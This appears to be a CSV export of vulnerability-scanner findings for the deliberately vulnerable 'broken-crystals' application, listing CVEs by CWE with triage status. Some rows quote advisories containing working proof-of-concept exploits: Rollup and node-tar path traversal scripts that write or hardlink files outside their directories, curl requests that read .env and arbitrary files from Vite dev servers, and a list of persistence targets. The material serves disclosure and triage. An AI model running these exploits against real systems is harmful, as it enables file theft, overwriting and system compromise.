GRP-broken-crystals-CWE-22-348,dep-check,broken-crystals,CWE-22,high,rollup:4.22.4,"### Summary The Rollup module bundler (specifically v4.x and present in current source) is vulnerable to an Arbitrary File Write via Path Traversal. Insecure file name sanitization in the core engine allows an attacker to control output filenames (e.g., via CLI named inputs, manual chunk aliases, or malicious plugins) and use traversal sequences (`../`) to overwrite files anywhere on the host filesystem that the build process has permissions for. This can lead to persistent Remote Code Execution (RCE) by overwriting critical system or user configuration files. ### Details The vulnerability is caused by the combination of two flawed components in the Rollup core: 1. **Improper Sanitization**: In `src/utils/sanitizeFileName.ts`, the `INVALID_CHAR_REGEX` used to clean user-provided names for chunks and assets excludes the period (`.`) and forward/backward slashes (`/`, `\`). ```typescript // src/utils/sanitizeFileName.ts (Line 3) const INVALID_CHAR_REGEX = /[\u0000-\u001F""#$%&*+,:;<=>?[\]^`{|}\u007F]/g; ``` This allows path traversal sequences like `../../` to pass through the sanitizer unmodified. 2. **Unsafe Path Resolution**: In `src/rollup/rollup.ts`, the `writeOutputFile` function uses `path.resolve` to combine the output directory with the ""sanitized"" filename. ```typescript // src/rollup/rollup.ts (Line 317) const fileName = resolve(outputOptions.dir || dirname(outputOptions.file!), outputFile.fileName); ``` Because `path.resolve` follows the `../` sequences in `outputFile.fileName`, the resulting path points outside of the intended output directory. The subsequent call to `fs.writeFile` completes the arbitrary write. ### PoC A demonstration of this vulnerability can be performed using the Rollup CLI or a configuration file. **Scenario: CLI Named Input Exploit** 1. Target a sensitive file location (for demonstration, we will use a file in the project root called `pwned.js`). 2. Execute Rollup with a specifically crafted named input where the key contains traversal characters: ```bash rollup --input ""a/../../pwned.js=main.js"" --dir dist ``` 3. **Result**: Rollup will resolve the output path for the entry chunk as `dist + a/../../pwned.js`, which resolves to the project root. The file `pwned.js` is created/overwritten outside the `dist` folder. **Reproduction Files provided :** * `vuln_app.js`: Isolated logic exactly replicating the sanitization and resolution bug. * `exploit.py`: Automated script to run the PoC and verify the file escape. vuln_app.js ```js const path = require('path'); const fs = require('fs'); /** * REPLICATED ROLLUP VULNERABILITY * * 1. Improper Sanitization (from src/utils/sanitizeFileName.ts) * 2. Unsafe Path Resolution (from src/rollup/rollup.ts) */ function sanitize(name) { // The vulnerability: Rollup's regex fails to strip dots and slashes, // allowing path traversal sequences like '../' return name.replace(/[\u0000-\u001F""#$%&*+,:;<=>?[\]^`{|}\u007F]/g, '_'); } async function build(userSuppliedName) { const outputDir = path.join(__dirname, 'dist'); const fileName = sanitize(userSuppliedName); // Vulnerability: path.resolve() follows traversal sequences in the filename const outputPath = path.resolve(outputDir, fileName); console.log(`[*] Target write path: ${outputPath}`); if (!fs.existsSync(path.dirname(outputPath))) { fs.mkdirSync(path.dirname(outputPath), { recursive: true }); } fs.writeFileSync(outputPath, 'console.log(""System Compromised!"");'); console.log(`[+] File written successfully.`); } build(process.argv[2] || 'bundle.js'); ``` exploit.py ```py import subprocess from pathlib import Path def run_poc(): # Target a file outside the 'dist' folder poc_dir = Path(__file__).parent malicious_filename = ""../pwned_by_rollup.js"" target_path = poc_dir / ""pwned_by_rollup.js"" print(f""=== Rollup Path Traversal PoC ==="") print(f""[*] Malicious Filename: {malicious_filename}"") # Trigger the vulnerable app subprocess.run([""node"", ""poc/vuln_app.js"", malicious_filename]) if target_path.exists(): print(f""[SUCCESS] File escaped 'dist' folder!"") print(f""[SUCCESS] Created: {target_path}"") # target_path.unlink() # Cleanup else: print(""[FAILED] Exploit did not work."") if __name__ == ""__main__"": run_poc() ``` ## POC ```rollup --input ""bypass/../../../../../../../Users/vaghe/OneDrive/Desktop/pwned_desktop.js=main.js"" --dir dist``` <img width=""1918"" height=""1111"" alt=""image"" src=""https://github.com/user-attachments/assets/3474eb7c-9c4b-4acd-9103-c70596b490d4"" /> ### Impact This is a **High** level of severity vulnerability. * **Arbitrary File Write**: Attackers can overwrite sensitive files like `~/.ssh/authorized_keys`, `.bashrc`, or system binaries if the build process has sufficient privileges. * **Supply Chain Risk**: Malicious third-party plugins or dependencies can use this to inject malicious code into other parts of a developer's machine during the build phase. * **User Impact**: Developers running builds on untrusted repositories are at risk of system compromise.",pending,low,no,1
GRP-broken-crystals-CWE-22-349,dep-check,broken-crystals,CWE-22,high,tar:6.2.1,"### Summary node-tar contains a vulnerability where the security check for hardlink entries uses different path resolution semantics than the actual hardlink creation logic. This mismatch allows an attacker to craft a malicious TAR archive that bypasses path traversal protections and creates hardlinks to arbitrary files outside the extraction directory. ### Details The vulnerability exists in `lib/unpack.js`. When extracting a hardlink, two functions handle the linkpath differently: **Security check in `[STRIPABSOLUTEPATH]`:** ```javascript const entryDir = path.posix.dirname(entry.path); const resolved = path.posix.normalize(path.posix.join(entryDir, linkpath)); if (resolved.startsWith('../')) { /* block */ } ``` **Hardlink creation in `[HARDLINK]`:** ```javascript const linkpath = path.resolve(this.cwd, entry.linkpath); fs.linkSync(linkpath, dest); ``` **Example:** An application extracts a TAR using `tar.extract({ cwd: '/var/app/uploads/' })`. The TAR contains entry `a/b/c/d/x` as a hardlink to `../../../../etc/passwd`. - **Security check** resolves the linkpath relative to the entry's parent directory: `a/b/c/d/ + ../../../../etc/passwd` = `etc/passwd`. No `../` prefix, so it **passes**. - **Hardlink creation** resolves the linkpath relative to the extraction directory (`this.cwd`): `/var/app/uploads/ + ../../../../etc/passwd` = `/etc/passwd`. This **escapes** to the system's `/etc/passwd`. The security check and hardlink creation use different starting points (entry directory `a/b/c/d/` vs extraction directory `/var/app/uploads/`), so the same linkpath can pass validation but still escape. The deeper the entry path, the more levels an attacker can escape. ### PoC #### Setup Create a new directory with these files: ``` poc/ ├── package.json ├── secret.txt ← sensitive file (target) ├── server.js ← vulnerable server ├── create-malicious-tar.js ├── verify.js └── uploads/ ← created automatically by server.js └── (extracted files go here) ``` **package.json** ```json { ""dependencies"": { ""tar"": ""^7.5.0"" } } ``` **secret.txt** (sensitive file outside uploads/) ``` DATABASE_PASSWORD=supersecret123 ``` **server.js** (vulnerable file upload server) ```javascript const http = require('http'); const fs = require('fs'); const path = require('path'); const tar = require('tar'); const PORT = 3000; const UPLOAD_DIR = path.join(__dirname, 'uploads'); fs.mkdirSync(UPLOAD_DIR, { recursive: true }); http.createServer((req, res) => { if (req.method === 'POST' && req.url === '/upload') { const chunks = []; req.on('data', c => chunks.push(c)); req.on('end', async () => { fs.writeFileSync(path.join(UPLOAD_DIR, 'upload.tar'), Buffer.concat(chunks)); await tar.extract({ file: path.join(UPLOAD_DIR, 'upload.tar'), cwd: UPLOAD_DIR }); res.end('Extracted\n'); }); } else if (req.method === 'GET' && req.url === '/read') { // Simulates app serving extracted files (e.g., file download, static assets) const targetPath = path.join(UPLOAD_DIR, 'd', 'x'); if (fs.existsSync(targetPath)) { res.end(fs.readFileSync(targetPath)); } else { res.end('File not found\n'); } } else if (req.method === 'POST' && req.url === '/write') { // Simulates app writing to extracted file (e.g., config update, log append) const chunks = []; req.on('data', c => chunks.push(c)); req.on('end', () => { const targetPath = path.join(UPLOAD_DIR, 'd', 'x'); if (fs.existsSync(targetPath)) { fs.writeFileSync(targetPath, Buffer.concat(chunks)); res.end('Written\n'); } else { res.end('File not found\n'); } }); } else { res.end('POST /upload, GET /read, or POST /write\n'); } }).listen(PORT, () => console.log(`http://localhost:${PORT}`)); ``` **create-malicious-tar.js** (attacker creates exploit TAR) ```javascript const fs = require('fs'); function tarHeader(name, type, linkpath = '', size = 0) { const b = Buffer.alloc(512, 0); b.write(name, 0); b.write('0000644', 100); b.write('0000000', 108); b.write('0000000', 116); b.write(size.toString(8).padStart(11, '0'), 124); b.write(Math.floor(Date.now()/1000).toString(8).padStart(11, '0'), 136); b.write(' ', 148); b[156] = type === 'dir' ? 53 : type === 'link' ? 49 : 48; if (linkpath) b.write(linkpath, 157); b.write('ustar\x00', 257); b.write('00', 263); let sum = 0; for (let i = 0; i < 512; i++) sum += b[i]; b.write(sum.toString(8).padStart(6, '0') + '\x00 ', 148); return b; } // Hardlink escapes to parent directory's secret.txt fs.writeFileSync('malicious.tar', Buffer.concat([ tarHeader('d/', 'dir'), tarHeader('d/x', 'link', '../secret.txt'), Buffer.alloc(1024) ])); console.log('Created malicious.tar'); ``` #### Run ```bash # Setup npm install echo ""DATABASE_PASSWORD=supersecret123"" > secret.txt # Terminal 1: Start server node server.js # Terminal 2: Execute attack node create-malicious-tar.js curl -X POST --data-binary @malicious.tar http://localhost:3000/upload # READ ATTACK: Steal secret.txt content via the hardlink curl http://localhost:3000/read # Returns: DATABASE_PASSWORD=supersecret123 # WRITE ATTACK: Overwrite secret.txt through the hardlink curl -X POST -d ""PWNED"" http://localhost:3000/write # Confirm secret.txt was modified cat secret.txt ``` ### Impact An attacker can craft a malicious TAR archive that, when extracted by an application using node-tar, creates hardlinks that escape the extraction directory. This enables: **Immediate (Read Attack):** If the application serves extracted files, attacker can read any file readable by the process. **Conditional (Write Attack):** If the application later writes to the hardlink path, it modifies the target file outside the extraction directory. ### Remote Code Execution / Server Takeover | Attack Vector | Target File | Result | |--------------|-------------|--------| | SSH Access | `~/.ssh/authorized_keys` | Direct shell access to server | | Cron Backdoor | `/etc/cron.d/*`, `~/.crontab` | Persistent code execution | | Shell RC Files | `~/.bashrc`, `~/.profile` | Code execution on user login | | Web App Backdoor | Application `.js`, `.php`, `.py` files | Immediate RCE via web requests | | Systemd Services | `/etc/systemd/system/*.service` | Code execution on service restart | | User Creation | `/etc/passwd` (if running as root) | Add new privileged user | ## Data Exfiltration & Corruption 1. **Overwrite arbitrary files** via hardlink escape + subsequent write operations 2. **Read sensitive files** by creating hardlinks that point outside extraction directory 3. **Corrupt databases** and application state 4. **Steal credentials** from config files, `.env`, secrets",pending,low,no,1
GRP-broken-crystals-CWE-22-350,dep-check,broken-crystals,CWE-22,low,vite:5.4.10,"### Summary The contents of files in [the project `root`](https://vite.dev/config/shared-options.html#root) that are denied by a file matching pattern can be returned to the browser. ### Impact Only apps explicitly exposing the Vite dev server to the network (using --host or [server.host config option](https://vitejs.dev/config/server-options.html#server-host)) are affected. Only files that are under [project `root`](https://vite.dev/config/shared-options.html#root) and are denied by a file matching pattern can be bypassed. - Examples of file matching patterns: `.env`, `.env.*`, `*.{crt,pem}`, `**/.env` - Examples of other patterns: `**/.git/**`, `.git/**`, `.git/**/*` ### Details [`server.fs.deny`](https://vite.dev/config/server-options.html#server-fs-deny) can contain patterns matching against files (by default it includes `.env`, `.env.*`, `*.{crt,pem}` as such patterns). These patterns were able to bypass for files under `root` by using a combination of slash and dot (`/.`). ### PoC ``` npm create vite@latest cd vite-project/ cat ""secret"" > .env npm install npm run dev curl --request-target /.env/. http://localhost:5173 ``` ![image](https://github.com/user-attachments/assets/822f4416-aa42-461f-8c95-a88d155e674b) ![image](https://github.com/user-attachments/assets/42902144-863a-4afb-ac5b-fc16effa37cc)",pending,low,no,1
GRP-broken-crystals-CWE-22-351,trivy,broken-crystals,CWE-22,high,curl@7.64.0-4+deb10u5,curl: SFTP path ~ resolving discrepancy,pending,low,no,1
GRP-broken-crystals-CWE-22-352,trivy,broken-crystals,CWE-22,critical,git@1:2.20.1-2+deb10u8,git: Recursive clones RCE,pending,low,no,1
GRP-broken-crystals-CWE-22-353,trivy,broken-crystals,CWE-22,critical,git-man@1:2.20.1-2+deb10u8,git: Recursive clones RCE,pending,low,no,1
GRP-broken-crystals-CWE-22-354,trivy,broken-crystals,CWE-22,high,libcurl3-gnutls@7.64.0-4+deb10u5,curl: SFTP path ~ resolving discrepancy,pending,low,no,1
GRP-broken-crystals-CWE-22-355,trivy,broken-crystals,CWE-22,high,libcurl4@7.64.0-4+deb10u5,curl: SFTP path ~ resolving discrepancy,pending,low,no,1
GRP-broken-crystals-CWE-22-356,trivy,broken-crystals,CWE-22,high,libcurl4-openssl-dev@7.64.0-4+deb10u5,curl: SFTP path ~ resolving discrepancy,pending,low,no,1
GRP-broken-crystals-CWE-22-357,trivy,broken-crystals,CWE-22,medium,linux-libc-dev@4.19.269-1,kernel: SUNRPC: Fix a suspicious RCU usage warning,pending,low,no,1
GRP-broken-crystals-CWE-22-358,trivy,broken-crystals,CWE-22,high,tar@4.4.19,node-tar: tar: node-tar: Arbitrary file overwrite and symlink poisoning via unsanitized linkpaths in archives,pending,low,no,1
GRP-broken-crystals-CWE-22-359,trivy,broken-crystals,CWE-22,high,tar@6.1.13,node-tar: tar: node-tar: Arbitrary file overwrite and symlink poisoning via unsanitized linkpaths in archives,pending,low,no,1
GRP-broken-crystals-CWE-22-360,bearer,broken-crystals,CWE-22,info,src/file/file.service.ts:29,"## Description Using unsanitized dynamic input to determine file paths can allow attackers to gain access to files and folders outside of the intended scope. This vulnerability occurs when input provided by users is directly used to access the filesystem without proper validation or sanitization. ## Remediations - **Do not** directly use user input to construct file paths. This can lead to unauthorized file access. - **Do** sanitize user input used in file paths. Replace patterns that can navigate out of intended directories, such as `..\..`, to prevent path traversal attacks. ```javascript var folder = target.replace(/^(\.\.(\/|\\|$))+/, ''); ``` - **Do** check for and remove any instances of the NULL byte (""%00"") in user input to guard against poison NULL byte attacks. ```javascript if (target.indexOf('\0') !== -1) { // Handle or reject the input } ``` - **Do** use path concatenation methods provided by your programming environment to securely combine user input with your base directory path. This ensures the final path starts within the intended scope. ```javascript const path = require(""path""); var pathname = path.join(""/public/"", folder); if (pathname.indexOf(""/public/"") !== 0) { // Handle or reject the input } ``` ## References - [OWASP Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal)",pending,low,no,1
GRP-broken-crystals-CWE-22-361,bearer,broken-crystals,CWE-22,info,src/file/hidden-upload.controller.ts:51,"## Description Using unsanitized dynamic input to determine file paths can allow attackers to gain access to files and folders outside of the intended scope. This vulnerability occurs when input provided by users is directly used to access the filesystem without proper validation or sanitization. ## Remediations - **Do not** directly use user input to construct file paths. This can lead to unauthorized file access. - **Do** sanitize user input used in file paths. Replace patterns that can navigate out of intended directories, such as `..\..`, to prevent path traversal attacks. ```javascript var folder = target.replace(/^(\.\.(\/|\\|$))+/, ''); ``` - **Do** check for and remove any instances of the NULL byte (""%00"") in user input to guard against poison NULL byte attacks. ```javascript if (target.indexOf('\0') !== -1) { // Handle or reject the input } ``` - **Do** use path concatenation methods provided by your programming environment to securely combine user input with your base directory path. This ensures the final path starts within the intended scope. ```javascript const path = require(""path""); var pathname = path.join(""/public/"", folder); if (pathname.indexOf(""/public/"") !== 0) { // Handle or reject the input } ``` ## References - [OWASP Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal)",pending,low,no,1
GRP-broken-crystals-CWE-226-362,trivy,broken-crystals,CWE-226,medium,linux-libc-dev@4.19.269-1,RHEL: Add Spectre-BHB mitigation for AmpereOne,pending,low,no,1
GRP-broken-crystals-CWE-229-363,trivy,broken-crystals,CWE-229,medium,linux-libc-dev@4.19.269-1,kernel: nf_tables: pointer math issue in nft_byteorder_eval(),pending,low,no,1
GRP-broken-crystals-CWE-23-364,dep-check,broken-crystals,CWE-23,low,vite:5.4.10,"### Summary Any HTML files on the machine were served regardless of the `server.fs` settings. ### Impact Only apps that match the following conditions are affected: - explicitly exposes the Vite dev server to the network (using --host or [server.host config option](https://vitejs.dev/config/server-options.html#server-host)) - `appType: 'spa'` (default) or `appType: 'mpa'` is used This vulnerability also affects the preview server. The preview server allowed HTML files not under the output directory to be served. ### Details The [serveStaticMiddleware](https://github.com/vitejs/vite/blob/9719497adec4ad5ead21cafa19a324bb1d480194/packages/vite/src/node/server/middlewares/static.ts#L123) function is in charge of serving static files from the server. It returns the [viteServeStaticMiddleware](https://github.com/vitejs/vite/blob/9719497adec4ad5ead21cafa19a324bb1d480194/packages/vite/src/node/server/middlewares/static.ts#L136) function which runs the needed tests and serves the page. The viteServeStaticMiddleware function [checks if the extension of the requested file is "".html""](https://github.com/vitejs/vite/blob/9719497adec4ad5ead21cafa19a324bb1d480194/packages/vite/src/node/server/middlewares/static.ts#L144). If so, it doesn't serve the page. Instead, the server will go on to the next middlewares, in this case [htmlFallbackMiddleware](https://github.com/vitejs/vite/blob/9719497adec4ad5ead21cafa19a324bb1d480194/packages/vite/src/node/server/middlewares/htmlFallback.ts#L14), and then to [indexHtmlMiddleware](https://github.com/vitejs/vite/blob/9719497adec4ad5ead21cafa19a324bb1d480194/packages/vite/src/node/server/middlewares/indexHtml.ts#L438). These middlewares don't perform any test against allow or deny rules, and they don't make sure that the accessed file is in the root directory of the server. They just find the file and send back its contents to the client. ### PoC Execute the following shell commands: ``` npm create vite@latest cd vite-project/ echo ""secret"" > /tmp/secret.html npm install npm run dev ``` Then, in a different shell, run the following command: `curl -v --path-as-is 'http://localhost:5173/../../../../../../../../../../../tmp/secret.html'` The contents of /tmp/secret.html will be returned. This will also work for HTML files that are in the root directory of the project, but are in the deny list (or not in the allow list). Test that by stopping the running server (CTRL+C), and running the following commands in the server's shell: ``` echo 'import path from ""node:path""; import { defineConfig } from ""vite""; export default defineConfig({server: {fs: {deny: [path.resolve(__dirname, ""secret_files/*"")]}}})' > [vite.config.js](http://vite.config.js) mkdir secret_files echo ""secret txt"" > secret_files/secret.txt echo ""secret html"" > secret_files/secret.html npm run dev ``` Then, in a different shell, run the following command: `curl -v --path-as-is 'http://localhost:5173/secret_files/secret.txt'` You will receive a 403 HTTP Response, because everything in the secret_files directory is denied. Now in the same shell run the following command: `curl -v --path-as-is 'http://localhost:5173/secret_files/secret.html'` You will receive the contents of secret_files/secret.html.",pending,low,no,1
GRP-broken-crystals-CWE-250-365,trivy,broken-crystals,CWE-250,medium,linux-libc-dev@4.19.269-1,Kernel: bluetooth: Unauthorized management command execution,pending,low,no,1
GRP-broken-crystals-CWE-252-366,trivy,broken-crystals,CWE-252,medium,libpython2.7-minimal@2.7.16-2+deb10u1,python: ftplib should not use the host from the PASV response,pending,low,no,1
GRP-broken-crystals-CWE-252-367,trivy,broken-crystals,CWE-252,medium,libpython2.7-stdlib@2.7.16-2+deb10u1,python: ftplib should not use the host from the PASV response,pending,low,no,1
GRP-broken-crystals-CWE-252-368,trivy,broken-crystals,CWE-252,medium,libpython3.7-minimal@3.7.3-2+deb10u4,python: ftplib should not use the host from the PASV response,pending,low,no,1
GRP-broken-crystals-CWE-252-369,trivy,broken-crystals,CWE-252,medium,libpython3.7-stdlib@3.7.3-2+deb10u4,python: ftplib should not use the host from the PASV response,pending,low,no,1
GRP-broken-crystals-CWE-252-370,trivy,broken-crystals,CWE-252,medium,python2.7@2.7.16-2+deb10u1,python: ftplib should not use the host from the PASV response,pending,low,no,1
GRP-broken-crystals-CWE-252-371,trivy,broken-crystals,CWE-252,medium,python2.7-minimal@2.7.16-2+deb10u1,python: ftplib should not use the host from the PASV response,pending,low,no,1
GRP-broken-crystals-CWE-252-372,trivy,broken-crystals,CWE-252,medium,python3.7@3.7.3-2+deb10u4,python: ftplib should not use the host from the PASV response,pending,low,no,1
GRP-broken-crystals-CWE-252-373,trivy,broken-crystals,CWE-252,medium,python3.7-minimal@3.7.3-2+deb10u4,python: ftplib should not use the host from the PASV response,pending,low,no,1
GRP-broken-crystals-CWE-264-374,zap,broken-crystals,CWE-264,medium,http://host.docker.internal:3001,Cross-Domain Misconfiguration,pending,low,no,1
GRP-broken-crystals-CWE-266-375,trivy,broken-crystals,CWE-266,high,libsystemd0@241-7~deb10u9,systemd: services with DynamicUser can create SUID/SGID binaries,pending,low,no,1
GRP-broken-crystals-CWE-266-376,trivy,broken-crystals,CWE-266,high,libudev1@241-7~deb10u9,systemd: services with DynamicUser can create SUID/SGID binaries,pending,low,no,1
GRP-broken-crystals-CWE-268-377,trivy,broken-crystals,CWE-268,high,libsystemd0@241-7~deb10u9,systemd: services with DynamicUser can get new privileges and create SGID binaries,pending,low,no,1
GRP-broken-crystals-CWE-268-378,trivy,broken-crystals,CWE-268,high,libudev1@241-7~deb10u9,systemd: services with DynamicUser can get new privileges and create SGID binaries,pending,low,no,1
GRP-broken-crystals-CWE-271-379,trivy,broken-crystals,CWE-271,high,libpq-dev@11.19-0+deb10u1,postgresql: non-owner 'REFRESH MATERIALIZED VIEW CONCURRENTLY' executes arbitrary SQL,pending,low,no,1
GRP-broken-crystals-CWE-271-380,trivy,broken-crystals,CWE-271,high,libpq5@11.19-0+deb10u1,postgresql: non-owner 'REFRESH MATERIALIZED VIEW CONCURRENTLY' executes arbitrary SQL,pending,low,no,1
GRP-broken-crystals-CWE-282-381,trivy,broken-crystals,CWE-282,high,linux-libc-dev@4.19.269-1,kernel: FUSE filesystem low-privileged user privileges escalation,pending,low,no,1
GRP-broken-crystals-CWE-284-382,dep-check,broken-crystals,CWE-284,info,vite:5.4.10,### Summary The contents of arbitrary files can be returned to the browser. ### Impact Only apps explicitly exposing the Vite dev server to the network (using `--host` or [`server.host` config option](https://vitejs.dev/config/server-options.html#server-host)) are affected. ### Details - base64 encoded content of non-allowed files is exposed using `?inline&import` (originally reported as `?import&?inline=1.wasm?init`) - content of non-allowed files is exposed using `?raw?import` `/@fs/` isn't needed to reproduce the issue for files inside the project root. ### PoC Original report (check details above for simplified cases): The ?import&?inline=1.wasm?init ending allows attackers to read arbitrary files and returns the file content if it exists. Base64 decoding needs to be performed twice ``` $ npm create vite@latest $ cd vite-project/ $ npm install $ npm run dev ``` Example full URL `http://localhost:5173/@fs/C:/windows/win.ini?import&?inline=1.wasm?init`,TP,medium,yes,1
GRP-broken-crystals-CWE-284-383,trivy,broken-crystals,CWE-284,critical,linux-libc-dev@4.19.269-1,kernel: irdma: Improper access control,TP,medium,yes,1
GRP-broken-crystals-CWE-284-384,trivy,broken-crystals,CWE-284,low,undici@5.21.0,nodejs-undici: fetch() with integrity option is too lax when algorithm is specified but hash value is in incorrect,TP,medium,yes,1
GRP-broken-crystals-CWE-285-385,trivy,broken-crystals,CWE-285,low,undici@5.21.0,"nodejs-undici: proxy-authorization header not cleared on cross-origin redirect for dispatch, request, stream, pipeline",pending,low,no,1
GRP-broken-crystals-CWE-287-386,trivy,broken-crystals,CWE-287,medium,jsonwebtoken@8.5.1,jsonwebtoken: Insecure default algorithm in jwt.verify() could lead to signature validation bypass,TP,medium,yes,1
GRP-broken-crystals-CWE-290-387,trivy,broken-crystals,CWE-290,low,libglib2.0-0@2.58.3-2+deb10u4,glib2: Signal subscription vulnerabilities,pending,low,no,1
GRP-broken-crystals-CWE-290-388,trivy,broken-crystals,CWE-290,low,libglib2.0-bin@2.58.3-2+deb10u4,glib2: Signal subscription vulnerabilities,pending,low,no,1
GRP-broken-crystals-CWE-290-389,trivy,broken-crystals,CWE-290,low,libglib2.0-data@2.58.3-2+deb10u4,glib2: Signal subscription vulnerabilities,pending,low,no,1
GRP-broken-crystals-CWE-290-390,trivy,broken-crystals,CWE-290,low,libglib2.0-dev@2.58.3-2+deb10u4,glib2: Signal subscription vulnerabilities,pending,low,no,1
GRP-broken-crystals-CWE-290-391,trivy,broken-crystals,CWE-290,low,libglib2.0-dev-bin@2.58.3-2+deb10u4,glib2: Signal subscription vulnerabilities,pending,low,no,1
GRP-broken-crystals-CWE-295-392,trivy,broken-crystals,CWE-295,medium,curl@7.64.0-4+deb10u5,curl: IDN wildcard match may lead to Improper Cerificate Validation,pending,low,no,1
GRP-broken-crystals-CWE-295-393,trivy,broken-crystals,CWE-295,medium,libcurl3-gnutls@7.64.0-4+deb10u5,curl: IDN wildcard match may lead to Improper Cerificate Validation,pending,low,no,1
GRP-broken-crystals-CWE-295-394,trivy,broken-crystals,CWE-295,medium,libcurl4@7.64.0-4+deb10u5,curl: IDN wildcard match may lead to Improper Cerificate Validation,pending,low,no,1
GRP-broken-crystals-CWE-295-395,trivy,broken-crystals,CWE-295,medium,libcurl4-openssl-dev@7.64.0-4+deb10u5,curl: IDN wildcard match may lead to Improper Cerificate Validation,pending,low,no,1
GRP-broken-crystals-CWE-295-396,trivy,broken-crystals,CWE-295,high,libperl5.28@5.28.1-6+deb10u1,perl: CPAN.pm does not verify TLS certificates when downloading distributions over HTTPS,pending,low,no,1
GRP-broken-crystals-CWE-295-397,trivy,broken-crystals,CWE-295,high,libssl-dev@1.1.1n-0+deb10u4,openssl: Denial of service by excessive resource usage in verifying X509 policy constraints,pending,low,no,1
GRP-broken-crystals-CWE-295-398,trivy,broken-crystals,CWE-295,high,libssl1.1@1.1.1n-0+deb10u4,openssl: Denial of service by excessive resource usage in verifying X509 policy constraints,pending,low,no,1
GRP-broken-crystals-CWE-295-399,trivy,broken-crystals,CWE-295,high,openssl@1.1.1n-0+deb10u4,openssl: Denial of service by excessive resource usage in verifying X509 policy constraints,pending,low,no,1
GRP-broken-crystals-CWE-295-400,trivy,broken-crystals,CWE-295,high,perl@5.28.1-6+deb10u1,perl: CPAN.pm does not verify TLS certificates when downloading distributions over HTTPS,pending,low,no,1
GRP-broken-crystals-CWE-295-401,trivy,broken-crystals,CWE-295,high,perl-base@5.28.1-6+deb10u1,perl: CPAN.pm does not verify TLS certificates when downloading distributions over HTTPS,pending,low,no,1
GRP-broken-crystals-CWE-295-402,trivy,broken-crystals,CWE-295,high,perl-modules-5.28@5.28.1-6+deb10u1,perl: CPAN.pm does not verify TLS certificates when downloading distributions over HTTPS,pending,low,no,1
GRP-broken-crystals-CWE-300-403,trivy,broken-crystals,CWE-300,medium,libsystemd0@241-7~deb10u9,systemd-resolved: Unsigned name response in signed zone is not refused when DNSSEC=yes,pending,low,no,1
GRP-broken-crystals-CWE-300-404,trivy,broken-crystals,CWE-300,medium,libudev1@241-7~deb10u9,systemd-resolved: Unsigned name response in signed zone is not refused when DNSSEC=yes,pending,low,no,1
GRP-broken-crystals-CWE-303-405,trivy,broken-crystals,CWE-303,medium,login@1:4.5-1.1,shadow-utils: possible password leak during passwd(1) change,pending,low,no,1
GRP-broken-crystals-CWE-303-406,trivy,broken-crystals,CWE-303,medium,passwd@1:4.5-1.1,shadow-utils: possible password leak during passwd(1) change,pending,low,no,1
GRP-broken-crystals-CWE-305-407,trivy,broken-crystals,CWE-305,medium,curl@7.64.0-4+deb10u5,curl: FTP too eager connection reuse,pending,low,no,1
GRP-broken-crystals-CWE-305-408,trivy,broken-crystals,CWE-305,medium,libcurl3-gnutls@7.64.0-4+deb10u5,curl: FTP too eager connection reuse,pending,low,no,1
GRP-broken-crystals-CWE-305-409,trivy,broken-crystals,CWE-305,medium,libcurl4@7.64.0-4+deb10u5,curl: FTP too eager connection reuse,pending,low,no,1
GRP-broken-crystals-CWE-305-410,trivy,broken-crystals,CWE-305,medium,libcurl4-openssl-dev@7.64.0-4+deb10u5,curl: FTP too eager connection reuse,pending,low,no,1
GRP-broken-crystals-CWE-312-411,bearer,broken-crystals,CWE-312,info,client/src/pages/auth/LoginNew/PasswordCheck.tsx:64,"## Description Storing sensitive data in `localStorage` poses a security risk. This vulnerability occurs when sensitive information is saved in the browser's local storage, making it susceptible to unauthorized access. ## Remediations - **Do not** store sensitive data in `localStorage`. This method exposes sensitive information to potential security threats. ```javascript localStorage.setItem('user', email); // unsafe ``` - **Do** use server-based session storage solutions to keep session data secure. This approach minimizes the risk of sensitive data exposure. - **Do** store only non-sensitive data in `localStorage`, such as a unique identifier, to reduce security risks. ```javascript localStorage.setItem('user', user.uuid); ``` ## References - [OWASP sensitive data exposure](https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure)",pending,low,no,1
GRP-broken-crystals-CWE-312-412,bearer,broken-crystals,CWE-312,info,client/src/pages/main/Userprofile.tsx:47,"## Description Storing sensitive data in `localStorage` poses a security risk. This vulnerability occurs when sensitive information is saved in the browser's local storage, making it susceptible to unauthorized access. ## Remediations - **Do not** store sensitive data in `localStorage`. This method exposes sensitive information to potential security threats. ```javascript localStorage.setItem('user', email); // unsafe ``` - **Do** use server-based session storage solutions to keep session data secure. This approach minimizes the risk of sensitive data exposure. - **Do** store only non-sensitive data in `localStorage`, such as a unique identifier, to reduce security risks. ```javascript localStorage.setItem('user', user.uuid); ``` ## References - [OWASP sensitive data exposure](https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure)",pending,low,no,1
GRP-broken-crystals-CWE-326-413,trivy,broken-crystals,CWE-326,low,dirmngr@2.2.12-1+deb10u2,gnupg2: OpenPGP Key Certification Forgeries with SHA-1,pending,low,no,1
GRP-broken-crystals-CWE-326-414,trivy,broken-crystals,CWE-326,low,gnupg@2.2.12-1+deb10u2,gnupg2: OpenPGP Key Certification Forgeries with SHA-1,pending,low,no,1
GRP-broken-crystals-CWE-326-415,trivy,broken-crystals,CWE-326,low,gnupg-l10n@2.2.12-1+deb10u2,gnupg2: OpenPGP Key Certification Forgeries with SHA-1,pending,low,no,1
GRP-broken-crystals-CWE-326-416,trivy,broken-crystals,CWE-326,low,gnupg-utils@2.2.12-1+deb10u2,gnupg2: OpenPGP Key Certification Forgeries with SHA-1,pending,low,no,1
GRP-broken-crystals-CWE-326-417,trivy,broken-crystals,CWE-326,low,gpg@2.2.12-1+deb10u2,gnupg2: OpenPGP Key Certification Forgeries with SHA-1,pending,low,no,1
GRP-broken-crystals-CWE-326-418,trivy,broken-crystals,CWE-326,low,gpg-agent@2.2.12-1+deb10u2,gnupg2: OpenPGP Key Certification Forgeries with SHA-1,pending,low,no,1
GRP-broken-crystals-CWE-326-419,trivy,broken-crystals,CWE-326,low,gpg-wks-client@2.2.12-1+deb10u2,gnupg2: OpenPGP Key Certification Forgeries with SHA-1,pending,low,no,1
GRP-broken-crystals-CWE-326-420,trivy,broken-crystals,CWE-326,low,gpg-wks-server@2.2.12-1+deb10u2,gnupg2: OpenPGP Key Certification Forgeries with SHA-1,pending,low,no,1
GRP-broken-crystals-CWE-326-421,trivy,broken-crystals,CWE-326,low,gpgconf@2.2.12-1+deb10u2,gnupg2: OpenPGP Key Certification Forgeries with SHA-1,pending,low,no,1
